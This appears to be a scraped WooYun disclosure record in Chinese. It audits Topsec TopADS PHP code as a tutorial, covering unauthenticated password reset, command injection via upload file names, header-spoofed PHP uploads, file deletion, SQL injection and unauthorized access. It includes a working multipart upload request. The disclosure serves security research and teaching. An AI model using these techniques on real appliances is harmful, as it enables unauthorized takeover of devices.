{"id": 86845, "wybug_id": "wooyun-2016-0176779", "wybug_title": "天融信TopADS多处无需登录高危漏洞打包(代码审计基础教程)", "wybug_corp": "天融信", "wybug_author": "xfkxfk", "wybug_date": "2016-02-18 17:52", "wybug_open_date": "2016-05-19 10:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向公众公开  简要描述： 天融信TopADS多处无需登录高危漏洞打包(代码审计基础教程)，包括密码重置，命令执行，文件上传，文件读取，文件删除，SQL注入，未授权访问等 详细说明：  之前提交了几个漏洞，官方说通过其他渠道知道漏洞了。那么我就把这些漏洞全发出来，当做一个文章了，厂商如果都通过其他渠道得知的话请忽略。既然这是一个基础教程文章，那么废话不多说，我们来看代码吧首先这个系统的web代码框架如图：\n\n这里的目录和文件结构如下：attachements为附件目录cachedata为缓存文件目录config当然就是配置文件目录了data和help无关紧要不用管了include这里面都是全局处理函数内容了libraries为系统全局使用的一些class文件modules是这里最重要的目录，里面都是系统功能文件，待会主要看这面的内容剩下的就是一些静态文件目录了index.php就是这个系统的入口文件了下面开始进入index.php，一步一步了解这个系统\n<?php/** * Ngtos * @package\t\tNgtos * @author\t\tNgtos Php Dev Team * @link\t\thttp://**.**.**.** * @since\t\tVersion 1.0 * @date     \t2014/1/8 10:14 * @filesource */session_start();setcookie('PHPSESSID', session_id());/** * 设置错误级别  */error_reporting(E_ERROR | E_PARSE);/** * 设置默认时区 */$timezone = \"+8\";if (file_exists(\"/tmp/tos_timezone_tmpfile\")) {    $timezone = trim(file_get_contents(\"/tmp/tos_timezone_tmpfile\"));    $timezone = strstr($timezone, '+') ? str_replace('+', '-', $timezone) : str_replace('-', '+', $timezone);}date_default_timezone_set(\"Etc/GMT$timezone\");/** * 设置编码为utf-8 */header(\"Content-type:text/html;charset=utf-8\");/** * 定义常量 ROOTPATH  */define('ROOTPATH', dirname(__FILE__));/** * 引入init.inc 文件，初始化环境 */require_once ROOTPATH . DIRECTORY_SEPARATOR . 'include' . DIRECTORY_SEPARATOR . 'init.inc.php';?>\n前面都是一些系统设置内容主要看最后一句，包含了一个init.inc.php文件，跟进文件/include/init.inc.php\n<?phpif (!defined('ROOTPATH'))    exit('No direct script access allowed');/** * Ngtos * * @package\t\tNgtos * @author\t\tNgtos Php Dev Team * @link\t\thttp://www.**.**.**.** * @since\t\tVersion 1.0 * @date     \t2014/1/8 10:14 * @filesource */require_once ROOTPATH . '/config/config.inc.php';require_once ROOTPATH . '/config/message.php';require_once ROOTPATH . '/include/common.inc.php';require_once ROOTPATH . '/include/function.inc.php';require_once ROOTPATH . '/include/cfgeng.inc.php';require_once ROOTPATH . '/include/template.inc.php';/** * 获取session中设置的语言，未设置用浏览器默认的语言为网页的语言 */$lang = $_SESSION['language'] ? $_SESSION['language'] : get_browse_language();$GLOBALS['language'] = $lang;/** * 引入语言文件 */require_once TPLLANGDIR . 'templates.' . $lang . '.lang.php';$post_submit_action = $_POST['submit_post'];$get_url_param = $_GET['g'];require ROOTPATH . '/modules/ads/ads.php';require_once ROOTPATH . '/modules/ips/ips.mds.php';$NG = & load_class('Ngtos');$NG->run();?>\n这里引入了全局配置文件config内容，全局函数处理内容include里面的内容一般全局的过滤啊，参数处理啊等都在这些include的文件里面注意最后：\n$NG = & load_class('Ngtos');$NG->run();\n一般的run函数出来了，就说明程序已经进入正常运行状态了，来看看run的处理过程load_class函数在文件/include/common.inc.php\nif (!function_exists('load_class')) {    function &load_class($class, $directory = 'libraries') {        static $_classes = array();        if (isset($_classes[$class])) {            return $_classes[$class];        }        if (!file_exists(ROOTPATH . '/' . $directory . '/' . $class . '.class.php')) {            exit('Unable to locate the specified class: ' . $class . '.class.php');        }        require_once ROOTPATH . '/' . $directory . '/' . $class . '.class.php';        is_loaded($class);        $_classes[$class] = new $class();        return $_classes[$class];    }}\n这里可以看到根据传入的class值，调用libraries目录里面的class文件这里的class为Ngtos，所以加载的文件为：/libraries/Ngtos.class.php跟进Ngtos.class.php的run函数\npublic function run() {        $module = trim($_REQUEST['module']) ? trim($_REQUEST['module']) : 'login';        $action = trim($_REQUEST['action']) ? trim($_REQUEST['action']) : '';        if ($module == 'home' || $module == 'main' || $module == 'login' || $module == 'logout' || $module == 'password') {            $action = $module;            $module = 'page_frame';        }        if ($offset = @strpos($module, '_')) {            $folder = substr($module, 0, $offset);            $file = substr($module, $offset + 1);            $filename = ROOTPATH . '/modules/' . $folder . '/' . $file . '.mds.php';            if (!file_exists($filename)) {                $filename = ROOTPATH . '/modules/' . $folder . '/' . $file . '.php';            }        } else {            $filename = ROOTPATH . '/modules/' . $module . '.mds.php';            if (!file_exists($filename)) {                $filename = ROOTPATH . '/modules/' . $module . '.php';            }        }        if (!file_exists($filename)) {            die('Not Found');        }        require_once $filename;    }\n这里通过传入的参数module和action，加载对应的modules中的功能文件看到这里大概知道了，此TopADS系统是如何正常运行，如何正常传参，如何操作各种功能了剩下的就是审计功能文件了，都在modules文件夹下面了0x001 任意用户密码重置文件/modules/page/frame.mds.php\n<?phpswitch ($action) {......case 'change_password':        $rspString = ngtos_mngt_password_modify($_POST['name'], $_POST['password']);        if ($rspString == 0) {            echo $rspString;        } else {            echo getErrorInfo($rspString);        }        break;\n当action为change_password时，并没有判断$_SESSION['auth_id'])，直接操作ngtos_mngt_password_modify($_POST['name'], $_POST['password'])所以无需登录即可修改任意用户的密码了\n\n0x002 命令执行之前一个漏洞中提到过一个命令执行，这里我们拿出来不同的点文件modules/ads/ads_report_upload.mds.php\n<?phpinclude_once \"ads_filetypevalidation.php\";if ($action == \"upload_logo\") {\t$upFilePath = \"/usr/local/apache2/htdocs/attachements/\";    if (preg_match(\"/[\\x7f-\\xff]/\", $_FILES['file']['name'])) {         echo json_encode(array('file_infor' => '上传失败，文件名错误，请勿上传中文名文件'));        return;    }    if ($_FILES['file']['size'] > 819200) {        echo json_encode(array('file_infor' => '上传失败,文件过大,最大800K'));        return;    }\t$ok=@move_uploaded_file($_FILES['file']['tmp_name'], $upFilePath.$_FILES['file']['name']);    if($ok === FALSE){\t\techo json_encode(array('file_infor' => '上传失败'));\t}else{        $rst = FileTypeValidation::validation($upFilePath.$_FILES['file']['name'], 'jpg');        if ($rst ==  false) {            echo json_encode(array('file_infor' => '上传失败,文件非jpeg/jpg格式'));            system(\"rm -rf \" . $upFilePath.$_FILES['file']['name']);            return;        }\t\techo json_encode(array('file_infor' => '上传成功'));        $fp = fopen(\"/SE/web/logo.conf\", \"w\");        fwrite($fp, \"../../attachements/\".$_FILES['file']['name']);        fclose($fp);\t}}if ($action == \"read_logo\") {    $fp = fopen(\"/SE/web/logo.conf\", \"r\");    while (($line = fgets($fp)) != NULL) {        echo $line;    }}if ($action == \"default_logo\") {    $fp = fopen(\"/SE/web/logo.conf\", \"w\");    fwrite($fp, \"../../static/images/image/logo.jpg\");    fclose($fp);    echo \"../../static/images/image/logo.jpg\";}?>\n可以看到，这里上传时，没有任何判断，上传后判断了文件类型及文件头，这里不做详细分析当判断文件格式失败时，会把上传的文件删除掉，此时，将$_FILES['file']['name']拼接到命令中，进入system函数执行，导致命令执行\n\n0x003 多处文件上传第一处文件上传文件modules/ads/ads_report_upload.mds.php\n<?phpinclude_once \"ads_filetypevalidation.php\";if ($action == \"upload_logo\") {\t$upFilePath = \"/usr/local/apache2/htdocs/attachements/\";    if (preg_match(\"/[\\x7f-\\xff]/\", $_FILES['file']['name'])) {         echo json_encode(array('file_infor' => '上传失败，文件名错误，请勿上传中文名文件'));        return;    }    if ($_FILES['file']['size'] > 819200) {        echo json_encode(array('file_infor' => '上传失败,文件过大,最大800K'));        return;    }\t$ok=@move_uploaded_file($_FILES['file']['tmp_name'], $upFilePath.$_FILES['file']['name']);    if($ok === FALSE){\t\techo json_encode(array('file_infor' => '上传失败'));\t}else{        $rst = FileTypeValidation::validation($upFilePath.$_FILES['file']['name'], 'jpg');        if ($rst ==  false) {            echo json_encode(array('file_infor' => '上传失败,文件非jpeg/jpg格式'));            system(\"rm -rf \" . $upFilePath.$_FILES['file']['name']);            return;        }\t\techo json_encode(array('file_infor' => '上传成功'));        $fp = fopen(\"/SE/web/logo.conf\", \"w\");        fwrite($fp, \"../../attachements/\".$_FILES['file']['name']);        fclose($fp);\t}}\n上传时没有任何判断，但是上传后进行了判断跟进FileTypeValidation::validation\nprivate static $_fileFormats = Array('jpg' => 'FFD8FF', \t); public static function validation($filePath, $fileExt) \t{ \t\t// 文件格式未知 \t\tif (!isset(self::$_fileFormats[$fileExt])) \t\t{ \t\t\treturn false; \t\t} \t\t$length = strlen(self::$_fileFormats[$fileExt]); \t\t$bin = self::_readFile($filePath, $length); \t\t$fileHead = @unpack(\"H{$length}\", $bin); \t\t// 判断文件头 \t\tif (strtolower(self::$_fileFormats[$fileExt]) == $fileHead[1]) \t\t{ \t\t\treturn true; \t\t} \t\treturn false; \t} \t\tprivate function _readFile($filePath, $size) \t{ \t\t$file = fopen($filePath, \"rb\"); \t\t$bin = fread($file, $size); \t\tfclose($file); \t\treturn $bin; \t}\n从这里可以看出，判断时，从上传的文件中读取文件头是不是等于jpg的头FFD8FF，如果相等就返回true，此时上传成功那么我们上传一个php文件，然后加上jpg的头FFD8FF就ok了，成功上传文件\n\n\n\n\n\n第二处文件上传文件modules/ads/ads_staticwlist.php\nif ($action == \"import\") {        $upFilePath = \"/usr/local/apache2/htdocs/attachements/\";        if ($_FILES['file']['size'] > 819200) {            echo json_encode(array('file_infor' => 'error:上传失败,文件过大,最大800K'));            return;        }        $ok=@move_uploaded_file($_FILES['file']['tmp_name'], $upFilePath.$_FILES['file']['name']);        if($ok === FALSE){            echo json_encode(array('file_infor' => 'error:上传失败'));        } else {            $err = \"\";            $fp = fopen($upFilePath.$_FILES['file']['name'], \"r\");            while($line = fgets($fp)) {                $param['whitelist'] =  formatpost($line);                $rspString = getResponse(\"ddos global\", \"add\", $param, 2);                if (is_string($rspString)) {                    $err = $rspString;                } else{                    $sql = \"INSERT INTO ads_static_wlist values\".\"('\".formatpost($line).\"') \";                    $db->query($sql);                }            }            fclose($fp);            echo $err;        }    }\n直接上传，无任何过来直接发送请求：\nPOST /index.php?module=ads_ads_staticblist&action=import HTTP/1.1Host: **.**.**.**Connection: keep-aliveContent-Length: 196Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytMQws7FgWq9XfnQYReferer: https://**.**.**.**/index.php?g=ads_report_set_handleAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8------WebKitFormBoundarytMQws7FgWq9XfnQYContent-Disposition: form-data; name=\"file\"; filename=\"2.php\"Content-Type: image/jpeg<?php phpinfo()?>------WebKitFormBoundarytMQws7FgWq9XfnQY--\n\n\n第三处文件上传文件modules/ads/ads_staticblist.php\nif ($action == \"import\") {        $upFilePath = \"/usr/local/apache2/htdocs/attachements/\";        if ($_FILES['file']['size'] > 819200) {            echo json_encode(array('file_infor' => '上传失败,文件过大,最大800K'));            return;        }        $ok=@move_uploaded_file($_FILES['file']['tmp_name'], $upFilePath.$_FILES['file']['name']);        if($ok === FALSE){            echo json_encode(array('file_infor' => '上传失败'));        } else {            $err = \"\";            $fp = fopen($upFilePath.$_FILES['file']['name'], \"r\");            while($line = fgets($fp)) {                $param['blacklist'] =  formatpost($line);                $rspString = getResponse(\"ddos global\", \"add\", $param, 2);                if (is_string($rspString)) {                    $err = $rspString;                } else{                    $sql = \"INSERT INTO ads_static_blist values\".\"('\".formatpost($line).\"') \";                    $db->query($sql);                }            }            fclose($fp);            echo $err;        }            }\n原理同第二处上传，无过滤，直接上传直接发送第二处的请求即可上传成功，不在证明0x004 文件删除文件modules/ads/ads_ads_capture_tcpdump.php\nif ($post_submit_action == \"adscapture_tcpdump_delete_pcap\"){    $pcap_name = $_POST[\"pcap_name\"];    $file = \"/SE/ads_tcpdump/\".$pcap_name;    unlink($file);    return;}\n当$post_submit_action == \"adscapture_tcpdump_delete_pcap\"时，直接拼接参数进行unlink这里的$post_submit_action是前面我们分析入口是提到的$post_submit_action = $_POST['submit_post'];所以那前面的的文件上传，删除上传的1.php为例，成功删除\n\n0x005 文件读取文件读取见http://**.**.**.**/bugs/wooyun-2010-0176586这个漏洞0x006 SQL注入SQL注入漏洞的原因在漏洞http://**.**.**.**/bugs/wooyun-2010-0176616这个漏洞中已经给出了一部分，还有很多，但是原因相同，都是make_where惹的祸\nfunction make_where($POST){    $sql_where = \"\";    foreach (array_keys($POST) as $key)    {\t\t//除去与搜索条件不相关的字段\t\tif ('submit_post' == $key || 'filename' == $key || 'export_type' == $key || 'chart' == $key || 'param' == $key || 'usrname' == $key || 'table' == $key || 'limit' == $key || '' == $POST[$key])\t\t{\t\t\t  continue;\t\t}\t\tif($key == 'time_start')\t\t{\t\t\t$sql_where .= \"AND cur_t >= '$POST[$key]' \";\t\t}\t\telseif($key == 'time_end')\t\t{\t\t\t$sql_where .= \"AND cur_t <= '$POST[$key]' \";\t\t}\t\telse\t\t{\t//组装搜索条件\t\t\t$sql_where .= \"AND $key = '$POST[$key]' \";\t\t}\t}\t//除去最开始的'AND'\t$sql_where = substr($sql_where, 3);\treturn $sql_where;}\n这里将$_POST的内容处理时，在最后的else条件中$sql_where .= \"AND $key = '$POST[$key]' \";直接将key带入sql语句，导致sql注入漏洞之前的漏洞没有给出数据，厂商说不行，这里不上sqlmap的结果\n\n\n\n全局搜索make_where(即可，因为用到此函数的，基本都存在sql注入问题0x007 未授权访问这里主要是从有两部分原因：一个是直接没有走入口文件进入应用，直接访问的文件二个是从入口进入应用了，但是没有进行$_SESSION['auth_id']判断，也是可以直接访问的   漏洞证明：     修复方案：     版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2016-02-19 10:27 厂商回复： 已确认，谢谢提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-18 17:55 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1587 漏洞数:237        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  出教程了    \n     2016-02-18 18:54 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:810 漏洞数:127        | ®高级安全工程师 | WooYun认证√)\t\t \n  第二个法师    \n     2016-02-18 20:37 |    \t\tFire ant \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:34        | 他们回来了................)\t\t \n  教程赛高    \n     2016-02-19 00:27 |    \t\th3hz \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:5        )\t\t \n  这是大招?    \n     2016-02-19 08:40 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  天融信专业户，赞！    \n     2016-02-19 09:14 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:31        | 是金子总会发光，在还未发光之前，先磨磨)\t\t \n  这产品应该是代理的吧    \n     2016-02-19 10:23 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  赞一个 来看教程的    \n     2016-02-19 11:44 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  教程好。关注一下。    \n     2016-02-19 12:05 |    \t\t泰迪 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我想知道这个以后还能改么)\t\t \n  天融信外聘安全测试人员啊    \n     2016-02-19 12:12 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1712 漏洞数:261        | 我猜出了用户名，可我猜不出密码。)\t\t \n  审计只服xfkxfk跟P神。    \n     2016-02-19 13:16 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2313 漏洞数:351        | 呵呵！)\t\t \n  @_Thorns 服P神就对了    \n     2016-02-22 10:40 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | for fun……)\t\t \n  NS年度优秀员工！    \n     2016-02-22 11:14 |    \t\t蓝天 \t\t\t( 普通白帽子  |\t\t\t        Rank:428 漏洞数:102        | 互联网上拾破烂的胖子)\t\t \n  审计只服xfkxfk跟P神。    \n     2016-02-22 17:46 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1135 漏洞数:198        | px1624)\t\t \n  来看教程的    \n     2016-02-23 16:18 |    \t\t奈何彼岸 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:49        | 乌云一下你就知道)\t\t \n  求连载    \n     2016-03-16 13:46 |    \t\tANS5 \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:105        | 此心安处是吾乡)\t\t \n  就想说一个字：服！    \n     2016-05-08 13:41 |    \t\tred0x \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | pia~pia~pia~)\t\t \n  审计只服xfkxfk跟P神。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}